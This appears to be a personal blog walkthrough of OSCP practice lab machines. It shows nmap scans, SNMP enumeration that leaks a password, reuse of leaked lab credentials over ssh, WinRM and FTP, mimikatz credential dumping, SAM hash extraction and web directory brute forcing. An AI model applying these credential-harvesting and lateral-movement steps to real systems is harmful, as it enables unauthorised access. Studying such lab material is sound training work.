---
title: OSCP C
date: 2026-01-05
draft: false
ShowToc: true
TocOpen: true
tags:
  - blog
  - Windows-Privilege-Escalation-sensitive-data-PS-History-File-leak
  - vesta-rce-exploit
  - PDF-Check
  - Web-login-bruteForce
  - Linux-Privilege-Escalation-Cron-tar-Wild
  - Windows-Privilege-Escalation-GPGservice
  - offsec
lastmod: 2026-02-27T17:09:24.598Z
---
# Box Info

This lab guides learners through an Active Directory exploitation chain, beginning with credential discovery in a SQLite database on an exposed web server. By cracking the credentials, learners gain access to an internal system via WinRM, escalate privileges through binary analysis and pivoting, and extract the domain administrator hash to achieve full domain compromise.

```
10.10.X.152
Challenge 6 - DC01 OS Credentials:

No credentials were provided for this machine

192.168.X.153

Challenge 6 - MS01 OS Credentials:

Eric.Wallows / EricLikesRunning800

10.10.X.154

Challenge 6 - MS02 OS Credentials:

No credentials were provided for this machine

192.168.X.156

Challenge 6 - Frankfurt OS Credentials:

No credentials were provided for this machine

192.168.X.157

Challenge 6 - Charlie OS Credentials:

No credentials were provided for this machine

192.168.X.155

Challenge 6 - Pascha OS Credentials:

No credentials were provided for this machine
```

# Box Info 192.168.X.153

### ALL  Information Gathering 192.168.132.153

```
Host is up, received echo-reply ttl 125 (0.048s latency).
Scanned at 2025-12-29 19:29:41 HKT for 50s
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 125
135/tcp   open  msrpc        syn-ack ttl 125
139/tcp   open  netbios-ssn  syn-ack ttl 125
445/tcp   open  microsoft-ds syn-ack ttl 125
5040/tcp  open  unknown      syn-ack ttl 125
5985/tcp  open  wsman        syn-ack ttl 125
8000/tcp  open  http-alt     syn-ack ttl 125
47001/tcp open  winrm        syn-ack ttl 125
49664/tcp open  unknown      syn-ack ttl 125
49665/tcp open  unknown      syn-ack ttl 125
49666/tcp open  unknown      syn-ack ttl 125
49667/tcp open  unknown      syn-ack ttl 125
49668/tcp open  unknown      syn-ack ttl 125
49669/tcp open  unknown      syn-ack ttl 125
49670/tcp open  unknown      syn-ack ttl 125
49671/tcp open  unknown      syn-ack ttl 125

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 50.22 seconds
           Raw packets sent: 66870 (2.942MB) | Rcvd: 66716 (2.669MB)
------------------------------------------------------------------------------------------------------

─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.132.153 -oN serviceScan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 19:32 HKT
Nmap scan report for 192.168.132.153
Host is up (0.041s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          Microsoft IIS httpd 10.0
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-29T11:35:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.04 seconds
                                                                          

```

### DC01 SSH 22

Base on the given credit to login the MS01 by eric.wallows, but cant find any way to privilege enumeration , so will check more information in other ports

```
└─# ssh Eric.Wallows@192.168.132.153                                                                                                
The authenticity of host '192.168.132.153 (192.168.132.153)' can't be established.
ED25519 key fingerprint is SHA256:PMbZrT8kUg780yVuSoaF+1RVTe3iNvDE/DquCs74qWU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '192.168.132.153' (ED25519) to the list of known hosts.
Eric.Wallows@192.168.132.153's password: 
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.
                                               
oscp\eric.wallows@MS01 C:\Users\eric.wallows>  
```

### Web 8000 Freedom1 to administrator (Database leak)

After brute force the website 8000 , found the backup database `http://192.168.132.153:8000/Partner/Db` , and got the something like the password hashed

![Pasted image 20251229204417.png](/ob/Pasted%20image%2020251229204417.png)

Used the decoded password of  `Freedom1` to login by ssh , and the username can be also found in the backup database

```
ssh support@192.168.132.153     

Freedom1
```

### Reverse software leak data

After login , found the .exe `admintool.exe` which is likely directly to execute the admin command by support ,but it require to the password , if the password is falied , it will show the hash? ,so i checked the hash , and i think it will be the password of `December31`

![Pasted image 20251229205840.png](/ob/Pasted%20image%2020251229205840.png)

```
support@MS01 C:\Users\support>.\admintool.exe whoami    
Enter administrator password:

thread 'main' panicked at 'assertion failed: `(left == right)`
  left: `"d41d8cd98f00b204e9800998ecf8427e"`,
 right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace

```

![Pasted image 20251229205926.png](/ob/Pasted%20image%2020251229205926.png)

Login by `administrator` : `December31` by ssh , now have the highest privilege in the MS01 , so will do the lateral Movement to infect the MS01 , and used the mimikatz\[https://github.com/ParrotSec/mimikatz]  `sekurlsa::logonpasswords` to have the MS01 admin hash which can also found the https://crackstation.net/ to know the password is December31

```
ssh administrator@192.168.132.153        

December31
```

![Pasted image 20251229211609.png](/ob/Pasted%20image%2020251229211609.png)

![Pasted image 20251229211549.png](/ob/Pasted%20image%2020251229211549.png)

### MS01 sensitive data PS History File leak

> DC01 is a jump host , so need to config the proxy , like use the ligolo these tools to connect the MS01 host

After know the cred `Administrator : December31` ,we use the smb to test the DC01 , and found the  10.10.92.152 can be login

![Pasted image 20251229213326.png](/ob/Pasted%20image%2020251229213326.png)

Nmap reveal that they opened the 5985 , so login by `evil-winrm`, although we are the administrator in the DC01 , so next we need to find the way yo MS01

```shell
└─# sudo nmap 10.10.92.153 -p- -sS -Pn -n --disable-arp-ping               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 21:35 HKT
Nmap scan report for 10.10.92.153
Host is up (0.055s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
5985/tcp  open  wsman
8000/tcp  open  http-alt
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 199.34 seconds

```

{{< toggle "Tag 🏷️" >}}

{{< tag " Windows-Privilege-Escalation-sensitive-data-PS-History-File-leak" >}} The history file of the `ConsoleHost_history.txt` can be found the password of `hghgib6vHT3bVWF`

{{< /toggle >}}

The history file of the `ConsoleHost_history.txt` can be found the password of `hghgib6vHT3bVWF`

![Pasted image 20251229233322.png](/ob/Pasted%20image%2020251229233322.png)

![Pasted image 20251229235732.png](/ob/Pasted%20image%2020251229235732.png)

### MS02 Administrator to tom\_admin (backup file windows.old sensitive data)

> use the --local-auth to login the local account

Via the evil-winrm to know we are administrator in MS02

![Pasted image 20251230000128.png](/ob/Pasted%20image%2020251230000128.png)

In the Windows old folder , Found the SAM and SYSTEM file can be used to tom\_admin hash\
![Pasted image 20251230003228.png](/ob/Pasted%20image%2020251230003228.png)

![Pasted image 20251230003747.png](/ob/Pasted%20image%2020251230003747.png)

![Pasted image 20251230004208.png](/ob/Pasted%20image%2020251230004208.png)

# Box Info 192.168.X.156

### ALL  Information Gathering/NMAP

```shell
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.151.156 -oN serviceScan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 11:33 HKT
Nmap scan report for 192.168.151.156
Host is up (0.044s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
25/tcp   open  smtp     Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.203], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2026-01-02T03:33:37+00:00; -11s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http     nginx
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA TOP USER UIDL AUTH-RESP-CODE SASL(PLAIN LOGIN) STLS PIPELINING RESP-CODES
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: have Pre-login LOGIN-REFERRALS IDLE capabilities post-login more SASL-IR AUTH=PLAIN ENABLE STARTTLS OK ID IMAP4rev1 LITERAL+ listed AUTH=LOGINA0001
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
|_ssl-date: 2026-01-02T03:33:33+00:00; -14s from scanner time.
|_smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.203], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
587/tcp  open  smtp     Exim smtpd 4.90_1
|_ssl-date: 2026-01-02T03:31:22+00:00; -2m26s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.203], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: more AUTH=LOGINA0001 have Pre-login post-login listed ID AUTH=PLAIN ENABLE capabilities LOGIN-REFERRALS OK IDLE LITERAL+ SASL-IR IMAP4rev1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: USER PIPELINING RESP-CODES AUTH-RESP-CODE SASL(PLAIN LOGIN) CAPA TOP UIDL
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
2525/tcp open  smtp     Exim smtpd 4.90_1
|_ssl-date: 2026-01-02T03:31:33+00:00; -2m16s from scanner time.
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.203], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-11-08T08:15:37
|_Not valid after:  2032-11-05T08:15:37
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, LongColumnFlag, Support41Auth, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolOld, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, LongPassword, SwitchToSSLAfterHandshake, SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, SupportsLoadDataLocal, FoundRows, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: K:%g/AO\x17eYSi\x011\x08]\x05|\x14%
|_  Auth Plugin Name: mysql_native_password
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: oscp.exam &mdash; Coming Soon
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.151.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
Service Info: Host: oscp.exam; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1m16s, deviation: 1m14s, median: -2m16s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.09 seconds
                                                                  
```

```shell
└─# sudo nmap -sU --top-port=20 192.168.151.156

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 11:34 HKT
Nmap scan report for 192.168.151.156
Host is up (0.044s latency).

PORT      STATE         SERVICE
53/udp    open          domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   closed        netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open          snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknow
```

### SNMP Recon 161,162,10161,10162  --> scan

Got the jack:3PUKsX98BMupBiCf

```shell
└─# snmpbulkwalk -v2c -c public 192.168.151.156 -m all NET-SNMP-EXTEND-MIB::nsExtendObjects 
MIB search path: /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
Cannot find module (IANA-STORAGE-MEDIA-TYPE-MIB): At line 19 in /usr/share/snmp/mibs/ietf/VM-MIB
Did not find 'IANAStorageMediaType' in module #-1 (/usr/share/snmp/mibs/ietf/VM-MIB)
Cannot find module (IEEE8021-CFM-MIB): At line 30 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Cannot find module (LLDP-MIB): At line 35 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Did not find 'dot1agCfmMdIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMaIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepIdentifier' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepDbEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmIngressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmEgressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmRemoteMepState' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
Cannot find module (IANA-SMF-MIB): At line 28 in /usr/share/snmp/mibs/ietf/SMF-MIB
Did not find 'IANAsmfOpModeIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Did not find 'IANAsmfRssaIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Cannot find module (IANAPowerStateSet-MIB): At line 20 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB
Did not find 'PowerStateSet' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB)
Cannot find module (IANA-OLSRv2-LINK-METRIC-TYPE-MIB): At line 26 in /usr/share/snmp/mibs/ietf/OLSRv2-MIB
Did not find 'IANAolsrv2LinkMetricTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/OLSRv2-MIB)
Cannot find module (IANA-ENERGY-RELATION-MIB): At line 22 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB
Did not find 'IANAEnergyRelationship' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB)
Cannot find module (IANA-BFD-TC-STD-MIB): At line 30 in /usr/share/snmp/mibs/ietf/BFD-STD-MIB
Did not find 'IANAbfdDiagTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessOperModeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessStateTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationKeyTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password-cmd" = STRING: /bin/echo
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password" = STRING: -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password-cmd" = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password-cmd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password-cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password-cmd" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password-cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password-cmd" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password-cmd" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password" = STRING: Changing password for jack.
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password" = STRING: Changing password for jack.
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password-cmd" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password" = INTEGER: 256
NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password-cmd" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password".1 = STRING: Changing password for jack.
NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password-cmd".1 = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
                                                                                                               
```

### FTP 21  -- Scans

we got the cred from the  snmp `jack : 3PUKsX98BMupBiCf` which account can be login to ftp , and i use the wget to download all files

```shell
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─#  ftp 192.168.151.156

Connected to 192.168.151.156.
220 (vsFTPd 3.0.3)
Name (192.168.151.156:root): jack
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||12099|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003          220 Apr 04  2018 .bash_logout
-rw-r--r--    1 1003     1003         3771 Apr 04  2018 .bashrc
-rw-r--r--    1 1003     1003          807 Apr 04  2018 .profile
drwxr-xr-x    5 0        0            4096 Mar 06  2025 conf
-rw-r-----    1 0        0              33 Mar 06  2025 local.txt
drwxr-x--x    2 0        0            4096 Mar 06  2025 mail
drwx------    2 1003     1003         4096 Mar 06  2025 tmp
drwxr-xr-x    2 1003     1003         4096 Mar 06  2025 web
226 Directory send OK.
ftp> 
```

```shell
└─#  wget -r ftp://jack:3PUKsX98BMupBiCf@192.168.151.156/
--2026-01-02 11:52:06--  ftp://jack:*password*@192.168.151.156/
           => ‘192.168.151.156/.listing’
Connecting to 192.168.151.156:21... connected.
Logging in as jack ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

192.168.151.156/.listing                                     [ <=>                                                                                                                               ]     633  --.-KB/s    in 0s      

2026-01-02 11:52:06 (27.7 MB/s) - ‘192.168.151.156/.listing’ saved [633]

Removed ‘192.168.151.156/.listing’.
--2026-01-02 11:52:06--  ftp://jack:*password*@192.168.151.156/.bash_logout
           => ‘192.168.151.156/.bash_logout’
==> CWD not required.
==> PASV ... done.    ==> RETR .bash_logout ... done.
Length: 220

192.168.151.156/.bash_logout                             100%[==================================================================================================================================>]     220  --.-KB/s    in 0s      

2026-01-02 11:52:06 (16.1 MB/s) - ‘192.168.151.156/.bash_logout’ saved [220]

--2026-01-02 11:52:06--  ftp://jack:*password*@192.168.151.156/.bashrc
           => ‘192.168.151.156/.bashrc’
==> CWD not required.
==> PASV ... done.    ==> RETR .bashrc ... done.

```

```shell
┌──(haydon_env)─(root㉿kali)-[~/Desktop/ftp/192.168.151.156]
└─# tree
.
├── conf
│   ├── dns
│   ├── mail
│   └── web
├── mail
├── tmp
└── web

8 directories, 0 files

```

### SSH 22  -- Scans

the account of jack is  not available.

```shell
┌──(haydon_env)─(root㉿kali)-[~/Desktop/ftp/192.168.151.156]
└─#  ssh jack@192.168.151.156 

The authenticity of host '192.168.151.156 (192.168.151.156)' can't be established.
ED25519 key fingerprint is SHA256:XOrfyRILrhv643a6XVX/O4yFHPIpLjGfMDwP5uOu9kM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.151.156' (ED25519) to the list of known hosts.
jack@192.168.151.156's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan  2 00:11:23 EST 2026

  System load:  0.0                Processes:             183
  Usage of /:   12.2% of 28.45GB   Users logged in:       0
  Memory usage: 80%                IP address for ens160: 192.168.151.156
  Swap usage:   21%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

167 updates can be applied immediately.
146 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

This account is currently not available.
Connection to 192.168.151.156 closed.

```

### Unkown Port  993

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
└─# nc -nv 192.168.45.203  993 
(UNKNOWN) [192.168.45.203] 993 (imaps) : Connection refused
```

### Unkown Port  995

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
└─# nc -nv 192.168.151.156  995
(UNKNOWN) [192.168.151.156] 995 (pop3s) open
help
          
```

### Unkown Port  2525

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
└─# nc -nv 192.168.151.156  2525
(UNKNOWN) [192.168.151.156] 2525 (?) open
220 oscp.exam ESMTP Exim 4.90_1 Ubuntu Fri, 02 Jan 2026 00:29:42 -0500
```

### Web Recon 80🪲

### WebSite Directory BurteForce

Try to login the database of phpadmin by `jack`: `3PUKsX98BMupBiCf`, but failed

```
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       28l      127w     1402c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       29l      102w     1226c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       26l       84w     1055c http://192.168.151.156/
301      GET        7l       20w      242c http://192.168.151.156/phpmyadmin => http://192.168.151.156/phpmyadmin/
301      GET        7l       20w      239c http://192.168.151.156/webmail => http://192.168.151.156/webmail/
301      GET        7l       20w      245c http://192.168.151.156/phpmyadmin/js => http://192.168.151.156/phpmyadmin/js/
301      GET        7l       20w      252c http://192.168.151.156/phpmyadmin/templates => http://192.168.151.156/phpmyadmin/templates/
